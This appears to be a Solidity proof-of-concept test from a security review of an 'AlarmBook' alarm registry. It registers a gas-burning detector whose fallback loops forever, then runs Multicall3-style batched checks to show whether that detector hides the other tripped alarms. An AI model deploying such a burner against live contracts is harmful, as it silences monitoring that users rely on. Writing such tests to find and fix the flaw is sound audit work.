// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
import {AlarmBook} from "../src/AlarmBook.sol";

/// Same logic as Multicall3.aggregate3 (forwards all gas to each call, records failures when allowFailure).
contract MC3 {
    struct Call3 { address target; bool allowFailure; bytes callData; }
    struct Result { bool success; bytes returnData; }
    function aggregate3(Call3[] calldata calls) external payable returns (Result[] memory r) {
        r = new Result[](calls.length);
        for (uint256 i; i < calls.length; ++i) {
            (r[i].success, r[i].returnData) = calls[i].target.call(calls[i].callData);
            require(calls[i].allowFailure || r[i].success, "call failed");
        }
    }
}
contract PausedTrue { function paused() external pure returns (bool) { return true; } }
contract Burner { fallback() external { while (true) {} } }

contract IndepGasBurnerPoC {
    event log_named_uint(string key, uint256 val);
    AlarmBook book; MC3 mc; PausedTrue pt; Burner burner;
    bytes32[] honest; bytes32 burnKey;

    function setUp() public {
        book = new AlarmBook(address(this)); mc = new MC3(); pt = new PausedTrue(); burner = new Burner();
        for (uint256 i; i < 249; ++i) {
            honest.push(book.register(AlarmBook.Detector(AlarmBook.Kind.PAUSED, address(pt), i, 0, bytes32(0), bytes32(0))));
        }
        burnKey = book.register(AlarmBook.Detector(AlarmBook.Kind.PAUSED, address(burner), 0, 0, bytes32(0), bytes32(0)));
    }

    function _run(bool withBurner, uint256 at) internal returns (bool topOk, uint256 trippedSeen) {
        uint256 n = honest.length + (withBurner ? 1 : 0);
        MC3.Call3[] memory c = new MC3.Call3[](n);
        uint256 h;
        for (uint256 i; i < n; ++i) {
            bytes32 k = (withBurner && i == at) ? burnKey : honest[h++];
            c[i] = MC3.Call3(address(book), true, abi.encodeCall(AlarmBook.check, (k)));
        }
        (bool ok, bytes memory ret) = address(mc).call{gas: 50_000_000}(abi.encodeCall(MC3.aggregate3, (c)));
        topOk = ok;
        if (!ok) return (false, 0);
        MC3.Result[] memory r = abi.decode(ret, (MC3.Result[]));
        for (uint256 i; i < r.length; ++i) if (r[i].success && r[i].returnData.length == 32 && abi.decode(r[i].returnData, (bool))) trippedSeen++;
    }

    function test_control_noBurner_all249Seen() public {
        (bool ok, uint256 seen) = _run(false, 0);
        emit log_named_uint("tripped keys seen", seen);
        require(ok, "top"); require(seen == 249, "seen");
    }
    function test_poc_burnerFirst() public {
        (bool ok, uint256 seen) = _run(true, 0);
        emit log_named_uint("top-level ok", ok ? 1 : 0); emit log_named_uint("tripped keys seen", seen);
    }
    function test_poc_burnerMiddle() public {
        (bool ok, uint256 seen) = _run(true, 125);
        emit log_named_uint("top-level ok", ok ? 1 : 0); emit log_named_uint("tripped keys seen", seen);
    }
    function test_poc_burnerLast() public {
        (bool ok, uint256 seen) = _run(true, 249);
        emit log_named_uint("top-level ok", ok ? 1 : 0); emit log_named_uint("tripped keys seen", seen);
    }
}
